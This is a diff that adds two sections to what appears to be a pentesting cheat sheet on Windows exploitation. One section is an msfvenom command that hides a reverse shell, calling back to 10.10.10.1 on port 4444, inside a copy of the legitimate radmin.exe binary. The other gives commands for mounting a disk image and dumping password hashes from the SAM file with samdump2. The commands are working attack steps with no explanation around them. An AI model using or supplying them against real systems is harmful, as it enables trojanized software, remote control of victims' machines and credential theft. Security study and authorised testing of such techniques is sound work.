@@ -99,6 +99,18 @@ Compile python exploits to .exe for windows
 ## Pre-Compiled Exploits
 https://github.com/SecWiki/windows-kernel-exploits
 
+## embed msfvenom code into existing binaries
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe
+```
+
+## Steal SAM from image (or backup image)
+```bash
+mount <image> /mnt/mountpoint
+cd /mnt/mountpoint/Windows/system32/config
+samdump2 SYSTEM SAM
+```
+
 ## Cheat Sheets
 Mother Script
 
